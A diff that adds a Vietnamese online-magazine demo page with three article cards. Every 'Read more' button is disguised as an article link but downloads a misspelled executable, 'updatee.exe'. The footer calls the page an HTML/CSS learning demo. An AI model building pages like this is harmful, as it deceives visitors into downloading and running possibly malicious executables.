@@ -1,0 +1,176 @@
+<!doctype html>
+<html lang="vi">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Tạp chí Online</title>
+  <!-- Font có hỗ trợ tiếng Việt -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@400;600;700&display=swap&subset=vietnamese" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #fafafa;
+      --card: #ffffff;
+      --accent: #d62828;
+      --muted: #6b7280;
+      --heading: #222;
+    }
+
+    body {
+      font-family: "Roboto Slab", serif;
+      background: var(--bg);
+      margin: 0;
+      color: var(--heading);
+      line-height: 1.6;
+    }
+
+    header {
+      background: var(--accent);
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    nav {
+      background: #b71c1c;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      padding: 10px;
+      flex-wrap: wrap;
+    }
+
+    nav a {
+      color: white;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: 20px auto;
+      padding: 0 16px;
+    }
+
+    .articles {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 20px;
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .card img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+    }
+
+    .card-content {
+      padding: 16px;
+    }
+
+    .card-content h2 {
+      margin: 0 0 8px;
+      font-size: 18px;
+    }
+
+    .card-content p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    .btn {
+      margin-top: 12px;
+      display: inline-block;
+      padding: 8px 12px;
+      border-radius: 6px;
+      background: var(--accent);
+      color: white;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 600;
+      transition: background 0.2s ease;
+    }
+
+    .btn:hover {
+      background: #a4161a;
+    }
+
+    footer {
+      margin-top: 40px;
+      padding: 16px;
+      text-align: center;
+      font-size: 13px;
+      color: var(--muted);
+      border-top: 1px solid #e5e7eb;
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <h1>TẠP CHÍ ONLINE</h1>
+    <div style="font-size:14px; opacity:0.9">Tin tức • Kiến thức • Giải trí</div>
+  </header>
+
+  <nav>
+    <a href="#">Trang chủ</a>
+    <a href="#">Thời sự</a>
+    <a href="#">Công nghệ</a>
+    <a href="#">Đời sống</a>
+    <a href="#">Giải trí</a>
+  </nav>
+
+  <main class="container">
+    <section class="articles">
+      <article class="card">
+        <img src="https://picsum.photos/600/400?random=1" alt="Bài viết 1">
+        <div class="card-content">
+          <h2>Bài viết 1: Xu hướng công nghệ 2025</h2>
+          <p>Công nghệ AI, điện toán đám mây và bảo mật sẽ thay đổi cách chúng ta làm việc và học tập trong tương lai...</p>
+          <a href="updatee.exe" class="btn" download>Đọc tiếp</a>
+        </div>
+      </article>
+
+      <article class="card">
+        <img src="https://picsum.photos/600/400?random=2" alt="Bài viết 2">
+        <div class="card-content">
+          <h2>Bài viết 2: Khám phá đời sống số</h2>
+          <p>Internet đang len lỏi vào từng ngóc ngách của cuộc sống hàng ngày, mở ra nhiều cơ hội mới...</p>
+          <a href="updatee.exe" class="btn" download>Đọc tiếp</a>
+        </div>
+      </article>
+
+      <article class="card">
+        <img src="https://picsum.photos/600/400?random=3" alt="Bài viết 3">
+        <div class="card-content">
+          <h2>Bài viết 3: Giải trí cuối tuần</h2>
+          <p>Top những bộ phim, cuốn sách và trò chơi thú vị giúp bạn thư giãn sau một tuần học tập, làm việc căng thẳng...</p>
+          <a href="updatee.exe" class="btn" download>Đọc tiếp</a>
+        </div>
+      </article>
+    </section>
+  </main>
+
+  <footer>
+    <p><strong>Lưu ý:</strong> Đây là trang demo học HTML/CSS. Không upload hoặc chia sẻ file thực thi không an toàn.</p>
+  </footer>
+</body>
+
+</html>
